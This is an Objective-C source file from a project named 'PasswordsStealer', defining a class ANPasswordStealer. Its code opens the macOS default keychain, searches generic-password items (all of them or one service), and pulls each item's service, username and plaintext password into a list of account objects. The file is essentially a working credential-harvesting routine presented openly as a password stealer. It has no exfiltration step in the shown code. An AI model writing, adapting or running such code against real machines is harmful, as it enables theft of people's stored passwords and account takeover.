//
//  ANPasswordStealer.m
//  PasswordsStealer
//
//  Created by Alex Nichol on 5/3/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "ANPasswordStealer.h"


@implementation ANPasswordStealer

- (id)initWithService:(NSString *)serviceAttribute {
	if ((self = [super init])) {
		SecKeychainAttribute attribute;
		SecKeychainAttributeList list;
		
		keychain = NULL;
		search = NULL;
		
		SecKeychainCopyDefault(&keychain);
		NSAssert(keychain != nil, @"The keychain was not found.  This class doesn't work without a keychain.");
		
		if (serviceAttribute) {
			const char * string = [serviceAttribute UTF8String];
			attribute.data = (void *)string;
			attribute.length = (int)strlen(string);
			attribute.tag = kSecServiceItemAttr;
			list.count = 1;
			list.attr = (SecKeychainAttribute *)malloc(sizeof(SecKeychainAttribute));
			list.attr[0] = attribute;
		} else {
			list.attr = NULL;
			list.count = 0;
		}
		
		if (serviceAttribute)
			SecKeychainSearchCreateFromAttributes(keychain, kSecGenericPasswordItemClass, &list, &search);
		else SecKeychainSearchCreateFromAttributes(keychain, kSecGenericPasswordItemClass, NULL, &search);
		free(list.attr);
		NSAssert(search != nil, @"Invalid search created.  This will prevent the password stealer from working.");
	}
	return self;
}

- (NSDictionary *)nextAccount {
	SecKeychainItemRef res = NULL;
	SecKeychainAttributeList * attrs = NULL;
	
	UInt32 passwordLen = 0;
	char * password = NULL;
	
	SecItemAttr itemAttributes[] = {kSecAccountItemAttr, kSecServiceItemAttr};
	SecExternalFormat externalFormats[] = {kSecFormatUnknown, kSecFormatUnknown};
	SecKeychainAttributeInfo info = {sizeof(itemAttributes) /
		sizeof(*itemAttributes), (void *)&itemAttributes,
		(void *)&externalFormats};
	
	SecKeychainSearchCopyNext(search, &res);
	if (!res) {
		return nil;
	}
	
	SecKeychainItemCopyAttributesAndData(res, &info, NULL, &attrs, &passwordLen, (void **)&password);
	CFRelease(res);
	NSMutableDictionary * dict = [[[NSMutableDictionary alloc] init] autorelease];
	if (attrs) {
		for (int i = 0; i < attrs->count; i++) {
			SecKeychainAttribute * attr = &(attrs->attr[i]);
			if (attr->tag == kSecServiceItemAttr) {
				NSString * myString = [[NSString alloc] initWithBytes:attr->data length:attr->length encoding:NSUTF8StringEncoding];
				if (myString) [dict setObject:myString forKey:@"Service"];
				[myString release];
			} else if (attr->tag == kSecAccountItemAttr) {
				NSString * myString = [[NSString alloc] initWithBytes:attr->data length:attr->length encoding:NSUTF8StringEncoding];
				if (myString) [dict setObject:myString forKey:@"Username"];
				[myString release];
			}
		}
		if (password && passwordLen > 0) {
			NSString * passwordString = [[NSString alloc] initWithBytes:password length:passwordLen encoding:NSUTF8StringEncoding];
			if (passwordString) [dict setObject:passwordString forKey:@"Password"];
			[passwordString release];
		}
		if (password) free(password);
		free(attrs->attr);
		free(attrs);
		return dict;
	} else {
		if (password) free(password);
		@throw [NSException exceptionWithName:@"Invalid account" reason:@"The attributes were not found for the keychain item that was a result in the search." userInfo:nil];
	}
}

- (NSArray *)allPasswords {
	NSMutableArray * passwords = [NSMutableArray array];
	while (YES) {
		@try {
			NSDictionary * infoDictionary = [self nextAccount];
			if (!infoDictionary) break;
			ANAccount * account = [[ANAccount alloc] initWithDictionary:infoDictionary];
			[passwords addObject:[account autorelease]];
		} @catch (NSException * e) {
			NSLog(@"%@", [e description]);
		}
	}
	return passwords;
}

- (void)dealloc {
	CFRelease(keychain);
	CFRelease(search);
	[super dealloc];
}

@end
